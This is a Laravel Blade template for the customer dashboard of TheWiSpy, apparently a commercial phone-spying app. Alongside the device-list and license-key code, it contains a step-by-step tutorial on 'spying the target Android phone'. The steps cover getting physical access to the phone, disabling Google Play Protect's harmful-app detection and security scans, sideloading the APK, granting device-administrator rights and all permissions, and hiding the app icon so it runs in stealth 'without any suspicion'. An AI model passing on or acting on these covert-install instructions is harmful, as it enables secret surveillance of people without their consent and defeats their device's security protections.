@extends('layouts.user')
@section('pageTitle', 'Dashboard for Remote Mobile Monitoring') 
@section('content')
	<style>
	li {padding-bottom:10px;}
	.container {max-width:100%;}
		.pricing-tab-section .nav {max-width:264px; margin:0px auto; display:block !important; overflow:hidden;}
		.pricing-tab-section .nav li {float:left; text-align:center; }
		.pricing-tab-section .nav li a img {margin-right:20px;}
		.pricing-tab-section .nav li a {padding:10px 20px; border:1px solid #808285; display: inline-block;
			line-height: 35px;}
		.pricing-tab-section .navigation-link.active {background:yellow;}
		.first-link {border-top-left-radius:10px; border-bottom-left-radius:10px;}
		.second-link {border-top-right-radius:10px; border-bottom-right-radius:10px;}
		.price-box {width:33.33333%; float:left; padding:0px 10px; box-sizing:border-box; text-align:center; box-shadow: 1px 0px 8px 0px
		rgba(0,0,0,0.2);
			margin: 20px 0px;
			min-height: 565px;
			padding-top: 30px;}
		.price-box h1 {font-size:30px; color:#000000; padding:20px 0px;}
		.price-box h2 {font-size:40px; color:#000000;}
		.faq-section {width:auto; margin:0px auto; padding:90px 0px; padding-bottom:0px;}
		.faq-section h1 {text-align:center; font-size:30px; font-weight:500; color:#000;}
		.faq-section p {color:#000; font-size:12px; text-align:center;}
		.faq-box {width:50%; float:left; padding:0px 15px; box-sizing:border-box;}
		.price-box p {color:#; font-size:16px; font-weight:400; padding-bottom:15px;}
		.price-box p img {margin-right:20px;}
		.price-box p.disable {margin-left:40px; color:gray;}
		.we-can-do-pricing {width:auto; margin:0px auto; padding:90px 0px; background:#F1F2F2; margin-top:90px;}
		.we-can-do-pricing h1 {text-align:center; font-size:30px; color:#414042; padding-bottom:20px; font-weight:500;}
		.we-can-do-pricing p {text-align:center; color:#6F6F6F; font-size:12px; margin-bottom:100px !important	; }
		.cndo-pricing-box {width:30%; margin:0px 1.5%; float:left; padding:0px 10px; box-sizing:border-box; text-align:center; cursor:pointer; padding:60px 20px; box-sizing:border-box;}
		.cndo-pricing-box:hover {background:yellow;}
		.cndo-pricing-box:hover .forward-icon {display:block;}
		.cndo-pricing-box:hover .forward-icon img {position: absolute; z-index: 9999; margin-left: -35px;
			margin-top: 30px;}
		.cndo-pricing-box .forward-icon {display:none;}
		.cndo-pricing-box h2 {color:#414042; font-size:18px; font-weight:500; padding-bottom:15px; padding-top:15px;}
		.cndo-pricing-box.last-box h2 {padding-bottom:35px;}
		.cndo-pricing-box p {color:#6F6F6F; font-size:12px; margin:0px !important; line-height:25px; text-align:left;}
		.cndo-img img {position: absolute; margin-top: -112px;margin-left: -60px}
		.cndo-pricing-box:hover .cndo-img img {filter: brightness(0) invert(1);}
		.faq-box {width:50%; float:left; padding:0px 10px; box-sizing:border-box;}
		.accordian-section {background:#F1F2F2; padding:20px 20px; box-sizing:border-box; margin-bottom:20px; border-radius:20px;}
		.accordian-section .fa {margin-right:30px; font-size:12px; color:#414042;}
		.accordian-section button {font-weight:500; border:none; font-size:16px; color:#414042; cursor:pointer}
		.accordian-section p {font-size:12px; color:#414042;}
		.accordian-body {padding-top:30px; padding-left:45px;}
		.accordian-body p {text-align:left;}
		.faq-content {overflow:hidden; padding-top:60px;}
		.download-button {font-weight: 500;margin-bottom: 20px;}
		.things-text{margin-top: 10px;}
		.white-box img {width: 100%;}
				.device-title.right {
    padding-left: 15px;float: right;font-size: 14px;
}
	</style>

	<div class="row bg-title">
		@if (session('status'))
			<div class="alert alert-success">
				{{ session('status') }}
			</div>
		@endif
		<div class="col-lg-3 col-md-4 col-sm-4 col-xs-12">

			<h4 class="page-title">My Devices</h4> </div>

	</div>

	<!-- /.col-lg-12 -->

	<div class="row">

		<div class="col-md-12 col-lg-12 col-sm-12 col-xs-12">

			<div class="white-box">

				
				@if($clientlist->isEmpty())

				<h3 class="congrats-title">Congratulations! <span>You are almost done.</span></h3>
			
<div class="download-app desktop">


	<div class="download-section">
		<div class="col-md-4 center-sec">
	<p class="download-button">Download your App Form Here:</p>
						<a href="http://download.thewispy.com/" class="app-download-link">Download App Now
						</a>
						</div>
</div> 
	<div class="col-md-4 center-sec"><h2>OR</h2></div>
<div class="next-qr">
	<div class="col-md-4 center-sec">
		<p><strong>Scan this QrCode to Download App</strong>  </p>
					{!! QrCode::generate('https://download.thewispy.com/'); !!}
					<!-- <div class="heading-spliting"><h1>Use the Key to Activate your App</h1></div> -->
	</div>
</div>
</div>

<div class="download-license desktop	">
				<div class="col-md-4 center-sec">
						<p>
							<strong>You can use License Key<br>
								<button onclick="copyToClipboard('#myInput')">Press to Copy License Key</button>

								<span style="background: #ec008c;border-radius: 10px;color: #fff;font-size: 16px;margin-right: 20px;display: inline-block;border: 1px solid #ec008c;text-align: center;margin-top: 10px;margin-bottom: 10px; padding:10px" id="myInput">
									{{$clientlist_plan->key}}
								</span>
								
							</strong>
						</p>
				</div>


	<div class="col-md-4 center-sec">
		<h2>OR</h2>
	</div>


				<div class="col-md-4 center-sec">
					<p><strong>Scan this QrCode to Copy License Key</strong>  </p>
					{!! QrCode::generate($clientlist_plan->key); !!}
				</div>	
			</div>


					
						<p class="">
							<strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</strong>
					</p>

					<p class="things-text">
							<strong>What Things You Require to get Start Spying the Target Android Phone?</strong>
					</p>	





				<ul id="tutorail-list">
					<iframe id="tutorail-vid" width="100%" height="315" src="https://www.youtube.com/embed/ieJEvs2zbr4" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
				<p class="note-for-install"><span class="danger">*</span> You require physical access to the target phone or tablet to install TheWiSpy app in it. It may take a few minutes to complete the installation and setup process. You have to modify some settings of the target phone or tablet when installing TheWiSpy app</p>
				<li>
					For TheWiSpy installation preparation, open “Settings”. Then open “Lock Screen and Security”. Enable “Unknown Sources” and select on OK.
				</li>
				<img src="https://www.thewispy.com/wp-content/uploads/2020/06/TheWiSpy-app-setting.png" />
				<li>
					Once done, open “Settings” > “Security” > Google Play Protect”. Toggle off “Improve Harmful App Detection” and Disable “Scan Device for Security Threats”.
				</li>
				<img src="https://www.thewispy.com/wp-content/uploads/2020/06/TheWiSpy-Installation-Guide-Scan-Device-Threats.png"/>
				</ul>
				<p class="step_two_content"><strong>Step 2: Installation of TheWiSpy App:</strong></p>
				<ul id="tutorail-list">
					<li>
						 From the Set-Up Wizard page, you will get the app download link. Now, you require access to the target device physically for app installation. Once you have the target phone in your hand, open the app download link on it. Slide right to start downloading the app. Once the downloading gets completed, a notification will appear showing the APK file. You can open the file via a pop-up window or from the download folder of the target device. Tap on “Install” and then “Open” it to start the app.
					</li>
					<img src="https://www.thewispy.com/wp-content/uploads/2020/06/TheWiSpy-installation-guide-download-link.png" />
					<li>
						From the Set-Up Wizard page, you will get the app download link. Now, you require access to the target device physically for app installation. Once you have the target phone in your hand, open the app download link on it. Slide right to start downloading the app. Once the downloading gets completed, a notification will appear showing the APK file. You can open the file via a pop-up window or from the download folder of the target device. Tap on “Install” and then “Open” it to start the app.
					</li>
					<li>
						 Once you launch or open TheWiSpy application, you must carefully read and acknowledge the “Privacy Policy” and EULA. After accepting the terms and conditions of TheWiSpy, enter the license key to activate the application.
					</li>
					<img src="https://www.thewispy.com/wp-content/uploads/2020/06/TheWiSpy-installation-guide-privacy-and-eula.png" />
					<li>
						Please “Enter the child name” and “Age” and click next. Now click “Proceed to settings” and Turn “On” Google services in data usage access.
					</li>
					<img src="https://www.thewispy.com/wp-content/uploads/2020/06/TheWiSpy-installation-guide-child-information-and-data-usage.png" />
					<li>
						 Once done, follow the Setup Wizard to complete the app configuration on your target device.
					</li>
					<img src="https://www.thewispy.com/wp-content/uploads/2020/06/TheWiSpy-installation-guide-allow-data-usage-access.png" />
					<li>
						 Click next. Open “device administrator” and activate it.
					</li>
					<img src="https://www.thewispy.com/wp-content/uploads/2020/06/TheWiSpy-installation-guide-activate-device-administrator.png" />
					<li>
						Please make sure that you allow all the permission requests for the app installation.
					</li>
					<img src="https://www.thewispy.com/wp-content/uploads/2020/06/TheWiSpy-installation-guide-allow-permission-request.png" />
					<li>
						 NOTE: *Please make sure you allow all permissions.
					</li>
					<img src="https://www.thewispy.com/wp-content/uploads/2020/06/TheWiSpy-installation-guide-allow-permissions-request.png" />
					<li>
						 After installing TheWiSpy in your target Android phone, you can hide the app icon.
					</li>
					<img src="https://www.thewispy.com/wp-content/uploads/2020/06/TheWiSpy-installation-guide-hide-app-icon.png" />
					<li>
						TheWiSpy icon will not be shown in the app list once you remove the app icon from the settings menu. TheWiSpy app will completely function at stealth mode without any suspicion.
					</li>
				</ul>
				@else
					<h3 class="box-title"> Active Device(s) Monitored by TheWiSpy</h3>
				@foreach ($clientlist as $index=>$client)
				@php  
					$index += 1;
				@endphp
						@if($client->device_token == null)
							
						<div class="device-box">
							<div class="col-md-6">
								<div class="col-md-3">
									<i class="fa fa-mobile fa-fw" aria-hidden="true"></i>
								</div>
								<div class="col-md-9">
					<!-- 				<h4 class="device-title"><a href="{{url('device/'.$client->id)}}">
										{{ 'Device ' . $index }}
									</a></h4> -->

									<h4 class="device-title"><a href="{{url('setup-wizard-1/'.$client->id)}}">
										{{ 'Device ' . $index }}
									</a></h4>
									<li>Status: Inactive</li>
								</div>
								
							</div>
			
								

								
								<div class="col-md-6">
<!-- 								<h4 class="device-title right">
										<a href="{{url('device/'.$client->id)}}">
										How to Install
									</a>
								</h4> -->

								<h4 class="device-title right">
										<a href="{{url('setup-wizard-1/'.$client->id)}}">
										How to Install
									</a>
								</h4>
									<p><strong>Your License Key is <br><span style="background: #ec008c;border-radius: 10px;color: #fff;font-size: 14px;margin-right: 20px;display: inline-block;border: 1px solid #ec008c;text-align: center;margin-top: 10px;margin-bottom: 10px; padding:10px">{{$client->uniqueid}}</span></strong></p>
					<p class="download-button">Download your App Form Here:</p>
					<a href="http://download.thewispy.com/" class="app-download-link">Download App Now</a>
								</div>

					
						</div>
						@else
							<div class="device-box">
							<div class="col-md-6">
								<div class="col-md-3">
									<i class="fa fa-mobile fa-fw" aria-hidden="true"></i>
								</div>
								<div class="col-md-9">
									<h4 class="device-title"><a href="{{url('dashboard/'.$client->id)}}">
										{{ isset($client->modal)?ucfirst(trans($client->modal)):'' }}
									</a></h4>
									<li><i class="fa fa-assistive-listening-systems fa-fw" aria-hidden="true"></i>{{isset($client->manufacturer)?$client->manufacturer:''}}</li>
									<li><i class="fa fa-key fa-fw" aria-hidden="true"></i>{{ isset($client->uniqueid)?$client->uniqueid:''}}</li>
									<li><i class="fa fa-id-badge fa-fw" aria-hidden="true"></i> {{ isset($client->IMEI)?$client->IMEI:''	}}</li>
								</div>
							</div>
							<div class="col-md-6">
									<div class="col-md-4">
									<a href="{{ url('device-settings/').'/'.$client->id }}"><i class="fa fa-sliders" aria-hidden="true"></i></a>
									<a href="{{ url('device-settings/').'/'.$client->id }}"><span>Setting</span></a>
									</div>
									<div class="col-md-4">
									<a href="{{ url('dashboard').'/'.$client->id }}"><i class="fa fa-tachometer" aria-hidden="true"></i></a>
									<a href="{{ url('dashboard').'/'.$client->id }}"><span>Dashboard</span></a>
									</div>
								<!-- 	<div class="col-md-4">
									<i class="fa fa-refresh" aria-hidden="true"></i>
									<span>Renew</span>
									</div> -->

									@if(Auth::user()->id !=19 )
									
								<h4 class="device-title right">
										<a href="{{url('setup-wizard-1/'.$client->id)}}">
										How to Install
									</a>
								</h4>
								@endif
							</div>
						</div>


						@endif
				@endforeach
				@endif


			

		</div>

	</div>
	</div>
@endsection
@section('scripts')
	<script type="text/javascript">
	
	function copyToClipboard(element) {
  var $temp = $("<input>");
  $("body").append($temp);
  $temp.val($(element).text()).select();
  document.execCommand("copy");
  $temp.remove();
}


	</script>
@endsection